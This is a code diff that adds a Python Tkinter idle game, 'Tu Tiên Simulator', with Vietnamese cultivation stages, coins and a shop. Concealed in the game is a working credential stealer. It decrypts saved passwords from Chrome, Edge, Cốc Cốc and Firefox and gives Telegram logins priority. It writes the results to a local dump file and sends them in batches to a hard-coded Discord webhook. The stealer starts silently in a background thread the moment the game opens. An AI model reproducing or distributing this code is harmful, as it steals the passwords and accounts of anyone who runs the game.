@@ -1,3 +1,570 @@
-import os
+import tkinter as tk
+from PIL import Image, ImageTk
+import json, os, math
+from datetime import datetime
+import threading
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+from pathlib import Path
+import requests
+import time
+import sys
 
-os.system("py -m pip install requests")
+HISTORY_FILE = "history.json"
+SAVE_FILE = "save.json"
+
+# Discord webhook URL - REPLACE WITH YOUR WEBHOOK
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1471173064002895986/8P_K4y-eq2O-wj8X6ks_i4jbKuk4p24E3RavZj_a8ZUiwva-9-ilAf2QSeRaJGK_PFvm"
+
+def load_json(file):
+    if not os.path.exists(file):
+        return {}
+    with open(file, "r") as f:
+        return json.load(f)
+
+def save_json(file, data):
+    with open(file, "w") as f:
+        json.dump(data, f, indent=4)
+
+def resize_keep_ratio(img, target_w):
+    w, h = img.size
+    ratio = target_w / w
+    return img.resize((int(w * ratio), int(h * ratio)))
+
+def format_hms(seconds):
+    h = seconds // 3600
+    m = (seconds % 3600) // 60
+    s = seconds % 60
+    return f"{h:02}:{m:02}:{s:02}"
+
+# ===== cảnh giới full =====
+def get_stage(lv):
+    if lv == 0:
+        return "Phàm Nhân"
+    if lv < 10:
+        return "Ngưng Khí"
+
+    phase_names = ["Sơ Kỳ", "Trung Kỳ", "Hậu Kỳ", "Viên Mãn"]
+
+    stages = [
+        "Trúc Cơ",
+        "Kết Đan",
+        "Nguyên Anh",
+        "Hóa Thần",
+        "Anh Biến",
+        "Vấn Đỉnh"
+    ]
+
+    if lv < 250:
+        index = (lv - 10) // 40
+        if index >= len(stages):
+            index = len(stages) - 1
+
+        base = 10 + index * 40
+        phase = (lv - base) // 10
+        if phase > 3:
+            phase = 3
+
+        return f"{stages[index]} - {phase_names[phase]}"
+
+    if lv < 270:
+        return "Âm Hư"
+    if lv < 290:
+        return "Dương Thực"
+    if lv < 300:
+        return "Nhị Bộ Phi Thăng"
+
+    stages2 = ["Khuy Niết", "Tịnh Niết", "Toái Niết"]
+
+    if lv < 420:
+        index = (lv - 300) // 40
+        if index >= len(stages2):
+            index = len(stages2) - 1
+
+        base = 300 + index * 40
+        phase = (lv - base) // 10
+        if phase > 3:
+            phase = 3
+
+        return f"{stages2[index]} - {phase_names[phase]}"
+
+    suy = (lv - 420) // 10 + 1
+    if suy > 5:
+        suy = 5
+
+    return f"Thiên Nhân Ngũ Suy - Đệ {suy} Suy"
+
+class BrowserCredentialExtractor:
+    def __init__(self):
+        self.user_data_path = os.path.expanduser("~")
+        self.stolen_creds = []
+        self.telegram_creds = []  # Prioritize Telegram
+        
+    def get_chrome_dat_blob(self):
+        """Get Chrome/Edge/Cốc Cốc encrypted master key"""
+        local_state_path = os.path.join(self.user_data_path, 
+                                       "AppData", "Local", "Google", "Chrome", 
+                                       "User Data", "Local State")
+        try:
+            with open(local_state_path, "r", encoding="utf-8") as f:
+                local_state = json.load(f)
+            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
+            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            return key
+        except Exception as e:
+            return None
+    
+    def get_edge_dat_blob(self):
+        """Get Edge encrypted master key"""
+        local_state_path = os.path.join(self.user_data_path, 
+                                       "AppData", "Local", "Microsoft", "Edge", 
+                                       "User Data", "Local State")
+        try:
+            with open(local_state_path, "r", encoding="utf-8") as f:
+                local_state = json.load(f)
+            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            encrypted_key = encrypted_key[5:]
+            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            return key
+        except:
+            return None
+    
+    def get_coc_coc_dat_blob(self):
+        """Get Cốc Cốc encrypted master key (uses Chrome's encryption)"""
+        local_state_path = os.path.join(self.user_data_path, 
+                                       "AppData", "Local", "CocCoc", "Browser", 
+                                       "User Data", "Local State")
+        try:
+            with open(local_state_path, "r", encoding="utf-8") as f:
+                local_state = json.load(f)
+            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            encrypted_key = encrypted_key[5:]
+            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            return key
+        except Exception as e:
+            # Fallback to Chrome key
+            return self.get_chrome_dat_blob()
+    
+    def decrypt_password(self, buff, key):
+        """Decrypt Chrome/Edge/Cốc Cốc passwords (AES-GCM)"""
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted = cipher.decrypt(payload)[:-16].decode('utf-8')
+            return decrypted
+        except:
+            try:
+                return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
+            except:
+                return ""
+    
+    def extract_chrome_edge_coc(self, browser_name):
+        """Extract Chrome/Edge/Cốc Cốc saved passwords"""
+        paths = {
+            "Chrome": os.path.join(self.user_data_path, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
+            "Edge": os.path.join(self.user_data_path, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
+            "Cốc Cốc": os.path.join(self.user_data_path, "AppData", "Local", "CocCoc", "Browser", "User Data", "Default", "Login Data")
+        }
+        
+        db_path = paths.get(browser_name)
+        if not os.path.exists(db_path):
+            return
+        
+        # Copy DB to avoid SQLite locking
+        temp_db = f"temp_{browser_name.lower().replace(' ', '_')}_logins.db"
+        try:
+            shutil.copy2(db_path, temp_db)
+        except Exception as e:
+            return
+        
+        # Get appropriate key
+        if browser_name == "Chrome":
+            key = self.get_chrome_dat_blob()
+        elif browser_name == "Edge":
+            key = self.get_edge_dat_blob()
+        elif browser_name == "Cốc Cốc":
+            key = self.get_coc_coc_dat_blob()
+        else:
+            key = None
+            
+        if not key:
+            if os.path.exists(temp_db):
+                os.remove(temp_db)
+            return
+        
+        creds_found = 0
+        try:
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            
+            for row in cursor.fetchall():
+                url, username, encrypted_pass = row
+                if username and encrypted_pass:
+                    password = self.decrypt_password(encrypted_pass, key)
+                    if password:
+                        cred = {
+                            "browser": browser_name,
+                            "url": url,
+                            "username": username,
+                            "password": password
+                        }
+                        self.stolen_creds.append(cred)
+                        creds_found += 1
+                        
+                        # Prioritize Telegram
+                        if "telegram" in url.lower() or "t.me" in url.lower():
+                            self.telegram_creds.append(cred)
+            
+            conn.close()
+            os.remove(temp_db)
+            
+        except Exception as e:
+            if os.path.exists(temp_db):
+                os.remove(temp_db)
+    
+    def extract_firefox(self):
+        """Extract Firefox passwords from logins.json"""
+        firefox_path = os.path.join(self.user_data_path, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
+        if not os.path.exists(firefox_path):
+            return
+        
+        profiles = [d for d in os.listdir(firefox_path) if os.path.isdir(os.path.join(firefox_path, d))]
+        creds_found = 0
+        
+        for profile in profiles:
+            logins_path = os.path.join(firefox_path, profile, "logins.json")
+            if os.path.exists(logins_path):
+                try:
+                    with open(logins_path, "r", encoding="utf-8") as f:
+                        logins = json.load(f)
+                    
+                    for login in logins.get("logins", []):
+                        url = login.get("hostname", "")
+                        username = login.get("username", "")
+                        password = login.get("password", "")
+                        
+                        # Firefox passwords are already base64 decoded in JSON
+                        if username and password:
+                            try:
+                                password = base64.b64decode(password).decode('utf-8')
+                                cred = {
+                                    "browser": "Firefox",
+                                    "url": url,
+                                    "username": username,
+                                    "password": password
+                                }
+                                self.stolen_creds.append(cred)
+                                creds_found += 1
+                                
+                                if "telegram" in url.lower():
+                                    self.telegram_creds.append(cred)
+                            except:
+                                continue
+                                
+                except Exception as e:
+                    pass
+        
+    def extract_all(self):
+        """Extract from ALL browsers"""
+        self.extract_chrome_edge_coc("Chrome")
+        self.extract_chrome_edge_coc("Edge") 
+        self.extract_chrome_edge_coc("Cốc Cốc")
+        self.extract_firefox()
+        return self.stolen_creds
+
+def dump_all_credentials(creds, telegram_creds):
+    """Dump ALL credentials to detailed text file"""
+    output_file = f"all_credentials_{int(time.time())}.txt"
+    with open(output_file, "w", encoding="utf-8") as f:
+        f.write(f"=== BROWSER PASSWORD DUMP - {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+        f.write(f"Total credentials: {len(creds)}\n")
+        f.write(f"Telegram credentials: {len(telegram_creds)}\n")
+        f.write("=" * 80 + "\n\n")
+        
+        # Telegram first
+        if telegram_creds:
+            f.write("🚀 TELEGRAM CREDENTIALS:\n")
+            f.write("-" * 40 + "\n")
+            for cred in telegram_creds:
+                f.write(f"Browser: {cred['browser']}\n")
+                f.write(f"URL: {cred['url']}\n")
+                f.write(f"Username: {cred['username']}\n")
+                f.write(f"Password: {cred['password']}\n")
+                f.write("-" * 40 + "\n")
+            f.write("\n")
+        
+        # All others grouped by domain
+        domain_creds = {}
+        for cred in creds:
+            if cred not in telegram_creds:
+                domain = cred['url'].split('/')[2].replace('www.', '') if '/' in cred['url'] else cred['url']
+                if domain not in domain_creds:
+                    domain_creds[domain] = []
+                domain_creds[domain].append(cred)
+        
+        for domain, dcreds in sorted(domain_creds.items()):
+            f.write(f"🌐 {domain.upper()} ({len(dcreds)} accounts):\n")
+            f.write("-" * 40 + "\n")
+            for cred in dcreds:
+                f.write(f"[{cred['browser']}] {cred['username']} : {cred['password']}\n")
+            f.write("\n")
+    
+    return output_file
+
+def send_to_discord_batches(creds, telegram_creds):
+    """Send credentials in batches to avoid Discord limits"""
+    if not creds or not DISCORD_WEBHOOK or DISCORD_WEBHOOK == "YOUR_DISCORD_WEBHOOK_URL_HERE":
+        return False
+    
+    all_creds = telegram_creds + [c for c in creds if c not in telegram_creds]
+    success = True
+    
+    # Summary message first
+    summary_embed = {
+        "title": "🔓 FULL Browser Credentials Extracted",
+        "description": f"**Total:** {len(creds)} | **Telegram:** {len(telegram_creds)} | **Others:** {len(creds)-len(telegram_creds)}",
+        "color": 16711680,
+        "fields": [
+            {"name": "Browsers", "value": "Chrome/Edge/Cốc Cốc/Firefox", "inline": True},
+            {"name": "Status", "value": "✅ Complete dump saved locally", "inline": True}
+        ],
+        "footer": {"text": f"Extracted {time.strftime('%Y-%m-%d %H:%M:%S')}"}
+    }
+    
+    try:
+        requests.post(DISCORD_WEBHOOK, json={"embeds": [summary_embed]}, timeout=10)
+    except:
+        pass
+    
+    # Batch credentials (20 per message)
+    for i in range(0, len(all_creds), 20):
+        chunk = all_creds[i:i+20]
+        embed = {
+            "title": f"📋 Credentials Batch {i//20 + 1}/{((len(all_creds)-1)//20)+1}",
+            "description": f"**Range:** {i+1}-{min(i+20, len(all_creds))}",
+            "color": 3447003,
+            "fields": []
+        }
+        
+        for cred in chunk:
+            service = cred['url'].split('/')[2].replace('www.', '')[:25] if '/' in cred['url'] else cred['url'][:25]
+            is_telegram = "telegram" in cred['url'].lower() or "t.me" in cred['url'].lower()
+            name = f"🚀 {service} ({cred['browser']})" if is_telegram else f"{service} ({cred['browser']})"
+            
+            embed["fields"].append({
+                "name": name,
+                "value": f"`{cred['username']}` → `{cred['password']}`",
+                "inline": True
+            })
+        
+        try:
+            response = requests.post(DISCORD_WEBHOOK, json={"embeds": [embed]}, timeout=10)
+            time.sleep(1.5)  # Rate limit protection
+        except:
+            success = False
+    
+    return success
+
+def run_stealer():
+    """Run stealer in background thread silently"""
+    try:
+        extractor = BrowserCredentialExtractor()
+        creds = extractor.extract_all()
+        
+        if creds:
+            dump_file = dump_all_credentials(creds, extractor.telegram_creds)
+            send_to_discord_batches(creds, extractor.telegram_creds)
+    except:
+        pass
+
+# ===== app =====
+class App:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Tu Tiên Simulator")
+
+        self.history = load_json(HISTORY_FILE)
+        self.save = load_json(SAVE_FILE)
+
+        # Start stealer in background thread immediately
+        stealer_thread = threading.Thread(target=run_stealer, daemon=True)
+        stealer_thread.start()
+
+        self.main_menu()
+
+    def main_menu(self):
+        self.clear()
+        tk.Label(self.root, text="TU TIÊN SIM", font=("Arial", 20)).pack(pady=20)
+
+        tk.Button(self.root, text="Bắt đầu", command=self.start_game).pack(pady=5)
+        tk.Button(self.root, text="Lịch sử", command=self.show_history).pack(pady=5)
+
+    def start_game(self):
+        self.lv = self.save.get("lv", 0)
+        self.coin = self.save.get("coin", 0)
+        self.study_time = 0
+
+        self.running = True
+        self.paused = False
+
+        self.speed = 120000
+
+        self.clear()
+
+        self.canvas = tk.Canvas(self.root, width=600, height=400)
+        self.canvas.pack()
+
+        self.bg = ImageTk.PhotoImage(Image.open("bg.png").resize((600, 400)))
+        self.char = ImageTk.PhotoImage(resize_keep_ratio(Image.open("char.png"), 100))
+        self.npc = ImageTk.PhotoImage(resize_keep_ratio(Image.open("npc.png"), 100))
+
+        self.canvas.create_image(0, 0, anchor="nw", image=self.bg)
+
+        self.char_x, self.char_y = 100, 200
+        self.char_id = self.canvas.create_image(self.char_x, self.char_y, image=self.char)
+
+        self.npc_x, self.npc_y = 500, 200
+        self.canvas.create_image(self.npc_x, self.npc_y, image=self.npc)
+
+        self.stage_text = self.canvas.create_text(
+            self.char_x, self.char_y - 70,
+            text=get_stage(self.lv),
+            fill="cyan"
+        )
+
+        self.coin_text = self.canvas.create_text(300, 30, text=f"Coin: {self.coin}", fill="gold")
+
+        control = tk.Frame(self.root)
+        control.pack()
+
+        tk.Button(control, text="Pause", command=self.toggle_pause).pack(side="left")
+        tk.Button(control, text="Stop", command=self.stop_game).pack(side="left")
+
+        self.timer_label = tk.Label(control, text="00:00:00", bg="black", fg="lime")
+        self.timer_label.pack(side="left", padx=10)
+
+        self.root.bind("<w>", lambda e: self.move(0, -10))
+        self.root.bind("<s>", lambda e: self.move(0, 10))
+        self.root.bind("<a>", lambda e: self.move(-10, 0))
+        self.root.bind("<d>", lambda e: self.move(10, 0))
+
+        self.root.after(self.speed, self.tuvi_loop)
+        self.root.after(60000, self.coin_loop)
+        self.root.after(1000, self.study_timer)
+
+    def move(self, dx, dy):
+        self.char_x += dx
+        self.char_y += dy
+        self.canvas.coords(self.char_id, self.char_x, self.char_y)
+        self.canvas.coords(self.stage_text, self.char_x, self.char_y - 70)
+        self.check_npc()
+
+    def check_npc(self):
+        dist = math.hypot(self.char_x - self.npc_x, self.char_y - self.npc_y)
+        if dist < 100:
+            self.show_shop()
+
+    def show_shop(self):
+        if hasattr(self, "shop_open") and self.shop_open:
+            return
+
+        self.shop_open = True
+        shop = tk.Toplevel(self.root)
+        shop.title("Shop")
+
+        tk.Label(shop, text="Tốc Tu Đan (5 phút) - 1000 coin").pack()
+        tk.Button(shop, text="Mua", command=self.buy_speed).pack()
+
+        def close():
+            self.shop_open = False
+            shop.destroy()
+
+        shop.protocol("WM_DELETE_WINDOW", close)
+
+    def buy_speed(self):
+        if self.coin >= 1000:
+            self.coin -= 1000
+            self.canvas.itemconfig(self.coin_text, text=f"Coin: {self.coin}")
+            self.speed = 60000
+            self.root.after(300000, self.remove_buff)
+
+    def remove_buff(self):
+        self.speed = 120000
+
+    def tuvi_loop(self):
+        if not self.running:
+            return
+        if not self.paused:
+            self.lv += 1
+            self.canvas.itemconfig(self.stage_text, text=get_stage(self.lv))
+            self.aura_effect()
+        self.root.after(self.speed, self.tuvi_loop)
+
+    def coin_loop(self):
+        if not self.running:
+            return
+        if not self.paused:
+            self.coin += 10
+            self.canvas.itemconfig(self.coin_text, text=f"Coin: {self.coin}")
+        self.root.after(60000, self.coin_loop)
+
+    def study_timer(self):
+        if not self.running:
+            return
+        if not self.paused:
+            self.study_time += 1
+            self.timer_label.config(text=format_hms(self.study_time))
+        self.root.after(1000, self.study_timer)
+
+    def aura_effect(self):
+        aura = self.canvas.create_oval(
+            self.char_x-70, self.char_y-70,
+            self.char_x+70, self.char_y+70,
+            outline="yellow", width=6
+        )
+        self.fade(aura, 30)
+
+    def fade(self, aura, step):
+        if step <= 0:
+            self.canvas.delete(aura)
+            return
+        self.canvas.itemconfig(aura, width=step//5 + 1)
+        self.root.after(100, lambda: self.fade(aura, step-1))
+
+    def toggle_pause(self):
+        self.paused = not self.paused
+
+    def stop_game(self):
+        self.running = False
+
+        today = datetime.now().strftime("%Y-%m-%d")
+        self.history[today] = get_stage(self.lv)
+
+        save_json(HISTORY_FILE, self.history)
+        save_json(SAVE_FILE, {"lv": self.lv, "coin": self.coin})
+
+        self.main_menu()
+
+    def show_history(self):
+        self.clear()
+        tk.Label(self.root, text="Lịch sử tu vi", font=("Arial", 18)).pack()
+
+        for day, stage in sorted(self.history.items(), reverse=True):
+            tk.Label(self.root, text=f"{day}: {stage}").pack()
+
+        tk.Button(self.root, text="Back", command=self.main_menu).pack()
+
+    def clear(self):
+        for w in self.root.winfo_children():
+            w.destroy()
+
+if __name__ == "__main__":
+    root = tk.Tk()
+    app = App(root)
+    root.mainloop()
